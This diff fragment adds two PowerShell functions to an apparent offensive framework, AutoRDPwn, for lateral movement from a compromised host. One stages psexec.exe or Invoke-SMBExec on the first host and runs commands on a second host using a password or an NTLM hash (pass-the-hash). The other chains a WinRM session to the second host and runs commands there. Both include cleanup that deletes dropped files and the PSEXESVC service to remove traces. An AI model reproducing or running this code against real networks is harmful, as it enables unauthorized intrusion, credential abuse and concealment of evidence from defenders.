+            $plain = Read-ARSecret ('Password for ' + $User)
+            if (-not [string]::IsNullOrWhiteSpace($plain)) { $Password = $plain }
+        }
+    }
+    if ([string]::IsNullOrWhiteSpace($User)) { throw 'The PSexec hop needs a user name.' }
+    if ([string]::IsNullOrWhiteSpace($Hash) -and [string]::IsNullOrWhiteSpace($Password)) {
+        throw 'The PSexec hop needs either an NTLM hash or a password.'
+    }
+    $transport = 'password'
+    if (-not [string]::IsNullOrWhiteSpace($Hash)) { $transport = 'hash' }
+    $domain = [string]$script:ARTarget['Domain']
+    $proofLog = 'C:\Windows\Temp\' + (New-ARRemoteTempName '.log')
+    if ([string]::IsNullOrWhiteSpace($Command)) { $Command = 'echo AutoRDPwn hop payload ran at %DATE% %TIME% >> "' + $proofLog + '"' }
+    if (-not $script:ARInvokedFromOption) { $Command = Read-ARValue 'Command to run on the second host' $Command }
+    if ($Command -match "[\r\n]") { throw 'The command must be a single line.' }
+    # Only an artifact this handler named is ever deleted afterwards: a custom
+    # command owns whatever it writes.
+    $artifactHop = ''
+    if ($Command.Contains($proofLog)) { $artifactHop = $proofLog }
+    $probeBlock = {
+        param($hopHost, $hopPort)
+        $client = New-Object System.Net.Sockets.TcpClient
+        try {
+            $async = $client.BeginConnect($hopHost, $hopPort, $null, $null)
+            if (-not $async.AsyncWaitHandle.WaitOne(4000, $false)) { return $false }
+            $client.EndConnect($async)
+            return $true
+        }
+        catch { return $false }
+        finally { $client.Close() }
+    }
+    $reachable = [bool](Invoke-ARRemote -Session $session -ArgumentList $hop, 445 -ScriptBlock $probeBlock)
+    if (-not $reachable) { throw ('The second host ' + $hop + ' is unreachable from ' + $target + ' on TCP 445; nothing was staged.') }
+    $token = New-ARRemoteTempName
+    $executablePath = 'C:\Windows\Temp\' + $token + '.exe'
+    $scriptPath = 'C:\Windows\Temp\' + $token + '-smbexec.ps1'
+    $staged = New-Object System.Collections.Generic.List[string]
+    $removedFirst = New-Object System.Collections.Generic.List[string]
+    $removedHop = New-Object System.Collections.Generic.List[string]
+    $failed = New-Object System.Collections.Generic.List[string]
+    $started = $false
+    $exitCode = -1
+    $proof = ''
+    try {
+        if ($transport -eq 'hash') {
+            $localScript = Get-ARResourcePath 'Resources\Scripts\Invoke-SMBExec.ps1'
+            Copy-ARFileToTarget -LocalPath $localScript -RemotePath $scriptPath | Out-Null
+            $staged.Add($scriptPath)
+        }
+        if ($transport -eq 'password') {
+            Import-ARToolScript 'Resources\Scripts\Invoke-PSexec.ps1'
+            $localExecutable = Join-Path $script:ARTools 'psexec.exe'
+            if (-not (Test-Path -LiteralPath $localExecutable)) { throw 'PSexec could not be extracted.' }
+            Copy-ARFileToTarget -LocalPath $localExecutable -RemotePath $executablePath | Out-Null
+            $staged.Add($executablePath)
+        }
+        foreach ($path in $staged.ToArray()) {
+            if (-not $script:ARModuleFiles.Contains([string]$path)) { $script:ARModuleFiles.Add([string]$path) }
+        }
+        $hopBlock = {
+            param($mode, $transportKind, $exePath, $smbScript, $hopHost, $account, $secret, $hashText, $domainName, $line, $detach)
+            $invokeOnHop = {
+                param($remoteLine, $detached)
+                if ($transportKind -eq 'hash') {
+                    if (-not (Get-Command Invoke-SMBExec -ErrorAction SilentlyContinue)) { . $smbScript }
+                    $output = @(Invoke-SMBExec -Target $hopHost -Domain $domainName -Username $account -Hash $hashText -Command $remoteLine 2>&1)
+                    return [pscustomobject]@{ Exit = 0; Text = ((@($output) | ForEach-Object { [string]$_ }) -join "`n") }
+                }
+                $arguments = @(('\\' + $hopHost), '-accepteula', '-nobanner')
+                if (-not [string]::IsNullOrWhiteSpace($account)) { $arguments += @('-u', $account) }
+                if (-not [string]::IsNullOrWhiteSpace($secret)) { $arguments += @('-p', $secret) }
+                $arguments += @('-h')
+                if ($detached) { $arguments += @('-d') }
+                $arguments += @('cmd.exe', '/c', $remoteLine)
+                $output = @(& $exePath @arguments 2>&1)
+                return [pscustomobject]@{ Exit = [int]$LASTEXITCODE; Text = ((@($output) | ForEach-Object { [string]$_ }) -join "`n") }
+            }
+            return (& $invokeOnHop $line $detach)
+        }
+        Write-ARInfo ('Launching on ' + $hop + ' through ' + $target + ' (' + $transport + ')')
+        $run = Invoke-ARRemote -Session $session -ArgumentList 'run', $transport, $executablePath, $scriptPath, $hop, $User, $Password, $Hash, $domain, $Command, $true -ScriptBlock $hopBlock
+        $exitCode = [int]$run.Exit
+        $runText = ([string]$run.Text).Trim()
+        if ($exitCode -ne 0) { throw ('PSexec returned ' + [string]$exitCode + ' for ' + $hop + ': ' + $runText) }
+        $started = $true
+        if (-not [string]::IsNullOrWhiteSpace($runText)) { Write-ARInfo ('Hop output: ' + $runText) }
+        if ($artifactHop -ne '') {
+            $readLine = 'type "' + $artifactHop + '"'
+            for ($attempt = 0; $attempt -lt 15; $attempt++) {
+                Start-Sleep -Seconds 1
+                $read = Invoke-ARRemote -Session $session -ArgumentList 'proof', $transport, $executablePath, $scriptPath, $hop, $User, $Password, $Hash, $domain, $readLine, $false -ScriptBlock $hopBlock
+                $proof = ([string]$read.Text).Trim()
+                if (-not [string]::IsNullOrWhiteSpace($proof)) { break }
+            }
+            if ([string]::IsNullOrWhiteSpace($proof)) { Write-ARWarn ('No proof line appeared on ' + $hop + ' in 15 s; the payload may still be starting.') }
+            else { Write-ARSuccess ('Proof on ' + $hop + ': ' + $proof) }
+        }
+    }
+    finally {
+        if ($started -and $artifactHop -ne '') {
+            try {
+                $deleteLine = 'del /f /q "' + $artifactHop + '"'
+                $null = Invoke-ARRemote -Session $session -ArgumentList 'delete', $transport, $executablePath, $scriptPath, $hop, $User, $Password, $Hash, $domain, $deleteLine, $false -ScriptBlock $hopBlock
+                # The markers are ours, so the proof survives any target language.
+                $existsLine = 'if exist "' + $artifactHop + '" (echo ARHOP_PRESENT) else (echo ARHOP_ABSENT)'
+                $check = Invoke-ARRemote -Session $session -ArgumentList 'exists', $transport, $executablePath, $scriptPath, $hop, $User, $Password, $Hash, $domain, $existsLine, $false -ScriptBlock $hopBlock
+                if (([string]$check.Text).IndexOf('ARHOP_ABSENT') -ge 0) { $removedHop.Add($artifactHop) }
+                else { $failed.Add('artifact still on ' + $hop + ': ' + $artifactHop) }
+            }
+            catch { $failed.Add('artifact removal on ' + $hop + ' failed: ' + $_.Exception.Message) }
+        }
+        try {
+            $serviceCheck = Invoke-ARRemote -Session $session -ArgumentList $hop -ScriptBlock {
+                param($hopHost)
+                $output = @(& sc.exe ('\\' + $hopHost) 'query' 'PSEXESVC' 2>&1)
+                if ($LASTEXITCODE -ne 0) { return [pscustomobject]@{ Present = $false; Deleted = $false } }
+                $null = & sc.exe ('\\' + $hopHost) 'delete' 'PSEXESVC' 2>&1
+                return [pscustomobject]@{ Present = $true; Deleted = ([int]$LASTEXITCODE -eq 0) }
+            }
+            if ([bool]$serviceCheck.Present -and -not [bool]$serviceCheck.Deleted) { $failed.Add('the PSEXESVC service is still registered on ' + $hop) }
+            elseif ([bool]$serviceCheck.Present) { Write-ARSuccess ('Leftover PSEXESVC service on ' + $hop + ' deleted.') }
+        }
+        catch { }
+        try {
+            $paths = @($staged.ToArray())
+            if ($paths.Count -gt 0) {
+                $removal = Invoke-ARRemote -Session $session -ArgumentList (, @($paths)) -ScriptBlock {
+                    param($items)
+                    $gone = New-Object System.Collections.Generic.List[string]
+                    $kept = New-Object System.Collections.Generic.List[string]
+                    foreach ($path in @($items)) {
+                        try {
+                            Remove-Item -LiteralPath ([string]$path) -Force -ErrorAction Stop
+                            if (Test-Path -LiteralPath ([string]$path)) { $kept.Add([string]$path) } else { $gone.Add([string]$path) }
+                        }
+                        catch { $kept.Add([string]$path) }
+                    }
+                    return [pscustomobject]@{ Removed = @($gone.ToArray()); Failed = @($kept.ToArray()) }
+                }
+                foreach ($path in @($removal.Removed)) {
+                    [void]$script:ARModuleFiles.Remove([string]$path)
+                    $removedFirst.Add([string]$path)
+                }
+                foreach ($path in @($removal.Failed)) { $failed.Add('staged file still on ' + $target + ': ' + [string]$path) }
+            }
+        }
+        catch { $failed.Add('staged file removal on ' + $target + ' failed: ' + $_.Exception.Message) }
+        foreach ($item in $failed.ToArray()) { Write-ARWarn ('Cleanup: ' + [string]$item) }
+    }
+    Set-ARStatus 'PSexec hop finished' 'Ok'
+    return [pscustomobject]@{
+        Id            = '623'
+        Action        = 'HopPsExec'
+        Target        = $target
+        Hop           = $hop
+        User          = $User
+        Transport     = $transport
+        Command       = $Command
+        Started       = [bool]$started
+        ExitCode      = [int]$exitCode
+        Proof         = $proof
+        RemovedFirst  = @($removedFirst.ToArray())
+        RemovedHop    = @($removedHop.ToArray())
+        Failed        = @($failed.ToArray())
+    }
+}
+
+function Invoke-ARModuleHopWinRm {
+    param(
+        [string]$Computer = '',
+        [string]$User = '',
+        [string]$Password = '',
+        [string]$Command = ''
+    )
+    $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'WinRM hop'
+    $openedIntermediate = $false
+    if (-not $script:ARSession) { $openedIntermediate = $true }
+    $session = Get-ARTargetSession
+    if ([string]::IsNullOrWhiteSpace($Computer)) {
+        if ($script:ARInvokedFromOption) { throw 'The WinRM hop needs a second host; it cannot be prompted for in -option mode.' }
+        $Computer = Read-ARValue 'Second host (reached from the first one)'
+    }
+    $hop = $Computer.Trim()
+    if ([string]::IsNullOrWhiteSpace($hop)) { throw 'The second host is empty.' }
+    if ([string]::IsNullOrWhiteSpace($User)) { $User = Get-ARTargetUserName }
+    if ([string]::IsNullOrWhiteSpace($Password)) { $Password = [string]$script:ARTarget['Password'] }
+    if (-not $script:ARInvokedFromOption) {
+        $User = Read-ARValue 'User for the second host' $User
+        $plain = Read-ARSecret ('Password for ' + $User)
+        if (-not [string]::IsNullOrWhiteSpace($plain)) { $Password = $plain }
+    }
+    if ([string]::IsNullOrWhiteSpace($Command)) { $Command = 'hostname' }
+    if (-not $script:ARInvokedFromOption) { $Command = Read-ARValue 'Command to run on the second host' $Command }
+    if ($Command -match "[\r\n]") { throw 'The command must be a single line.' }
+    $probeBlock = {
+        param($hopHost, $hopPort)
+        $client = New-Object System.Net.Sockets.TcpClient
+        try {
+            $async = $client.BeginConnect($hopHost, $hopPort, $null, $null)
+            if (-not $async.AsyncWaitHandle.WaitOne(4000, $false)) { return $false }
+            $client.EndConnect($async)
+            return $true
+        }
+        catch { return $false }
+        finally { $client.Close() }
+    }
+    $reachable = [bool](Invoke-ARRemote -Session $session -ArgumentList $hop, 5985 -ScriptBlock $probeBlock)
+    if (-not $reachable) { throw ('The second host ' + $hop + ' is unreachable from ' + $target + ' on TCP 5985; no session was opened.') }
+    $opened = $false
+    $hopSessionId = 0
+    $output = ''
+    $exitCode = -1
+    $closedHop = $false
+    $closedIntermediate = $false
+    $failures = New-Object System.Collections.Generic.List[string]
+    $openBlock = {
+        param($hopHost, $account, $secret, $timeoutMs)
+        $parameters = @{ ComputerName = $hopHost; ErrorAction = 'Stop'; Name = ('ARHop_' + [guid]::NewGuid().ToString('N').Substring(0, 6)) }
+        if (-not [string]::IsNullOrWhiteSpace($account) -and -not [string]::IsNullOrWhiteSpace($secret)) {
+            $secure = ConvertTo-SecureString -String $secret -AsPlainText -Force
+            $parameters['Credential'] = New-Object System.Management.Automation.PSCredential($account, $secure)
+        }
+        $parameters['SessionOption'] = New-PSSessionOption -OpenTimeout $timeoutMs -OperationTimeout 60000 -CancelTimeout 5000
+        $hopSession = New-PSSession @parameters
+        # Global, not script: the hop session has to outlive the invocation that
+        # created it so the next remote block can chain through it.
+        $global:ARHopSession = $hopSession
+        return [pscustomobject]@{
+            Id       = [int]$hopSession.Id
+            Name     = [string]$hopSession.Name
+            State    = [string]$hopSession.State
+            Computer = [string]$hopSession.ComputerName
+        }
+    }
+    $runBlock = {
+        param($commandLine)
+        $hopSession = $global:ARHopSession
+        if ($null -eq $hopSession) { throw 'The chained session is gone.' }
+        $state = ''
+        try { $state = [string]$hopSession.State } catch { }
+        if ($state -ne 'Opened') { throw ('The chained session is ' + $state + ' instead of Opened.') }
+        return Invoke-Command -Session $hopSession -ArgumentList $commandLine -ScriptBlock {
+            param($line)
+            $text = @(& cmd.exe /c $line 2>&1)
+            return [pscustomobject]@{
+                Exit = [int]$LASTEXITCODE
+                Text = ((@($text) | ForEach-Object { [string]$_ }) -join "`n")
+            }
+        } -ErrorAction Stop
+    }
+    $closeBlock = {
+        $closedHop = $false
+        $problems = New-Object System.Collections.Generic.List[string]
+        $hopSession = $global:ARHopSession
+        if ($null -ne $hopSession) {
+            try {
+                Remove-PSSession -Session $hopSession -ErrorAction Stop
+                $global:ARHopSession = $null
+                $closedHop = $true
+            }
+            catch { $problems.Add('hop session: ' + $_.Exception.Message) }
+        }
+        $left = 0
+        foreach ($candidate in @(Get-PSSession -ErrorAction SilentlyContinue)) {
+            if ([string]$candidate.Name -notlike 'ARHop_*') { continue }
+            $left++
+            try { Remove-PSSession -Session $candidate -ErrorAction SilentlyContinue } catch { }
+        }
+        return [pscustomobject]@{ Closed = [bool]$closedHop; Left = [int]$left; Failed = @($problems.ToArray()) }
+    }
+    try {
+        $openedSession = Invoke-ARRemote -Session $session -ArgumentList $hop, $User, $Password, 15000 -ScriptBlock $openBlock
+        $hopSessionId = [int]$openedSession.Id
+        if ([string]$openedSession.State -ne 'Opened') { throw ('The chained session on ' + $hop + ' is ' + [string]$openedSession.State + ' instead of Opened.') }
+        $opened = $true
+        Write-ARSuccess ('Chained WinRM session opened: ' + $target + ' -> ' + $hop + ' (session ' + [string]$hopSessionId + ')')
+        $result = Invoke-ARRemote -Session $session -ArgumentList $Command -ScriptBlock $runBlock
+        $exitCode = [int]$result.Exit
+        $output = ([string]$result.Text).Trim()
+        Write-ARSuccess ('Output from ' + $hop + ' (exit ' + [string]$exitCode + '):')
+        Show-ARText $output
+    }
+    catch {
+        $failures.Add('hop session on ' + $hop + ': ' + $_.Exception.Message)
+        Write-ARWarn ('WinRM hop to ' + $hop + ' failed: ' + $_.Exception.Message)
+    }
+    finally {
+        try {
+            $teardown = Invoke-ARRemote -Session $session -ScriptBlock $closeBlock
+            $closedHop = [bool]$teardown.Closed
+            foreach ($item in @($teardown.Failed)) { $failures.Add([string]$item) }
+            if ([int]$teardown.Left -ne 0) { $failures.Add([string]$teardown.Left + ' ARHop session(s) still open on ' + $target) }
+            if ($closedHop) { Write-ARSuccess ('Chained session closed on ' + $target + ' (was ' + $hop + ')') }
+        }
+        catch {
+            $failures.Add('hop session teardown: ' + $_.Exception.Message)
+            Write-ARWarn ('Chained session could not be closed: ' + $_.Exception.Message)
+        }
+        if ($openedIntermediate) {
+            try {
+                Close-ARTargetSession
+                $closedIntermediate = $true
+                Write-ARInfo ('Intermediate session closed on ' + $target)
+            }
+            catch { $failures.Add('intermediate session teardown: ' + $_.Exception.Message) }
+        }
+        else { Write-ARInfo 'The intermediate session was already open before this action and is kept.' }
+    }
+    Set-ARStatus 'WinRM hop finished' 'Ok'
+    return [pscustomobject]@{
+        Id                 = '624'
+        Action             = 'HopWinRm'
+        Target             = $target
+        Hop                = $hop
+        User               = $User
+        Command            = $Command
+        HopOpened          = [bool]$opened
+        HopSessionId       = [int]$hopSessionId
+        ExitCode           = [int]$exitCode
+        Output             = $output
+        HopClosed          = [bool]$closedHop
+        IntermediateClosed = [bool]$closedIntermediate
+        Failed             = @($failures.ToArray())
+    }
+}
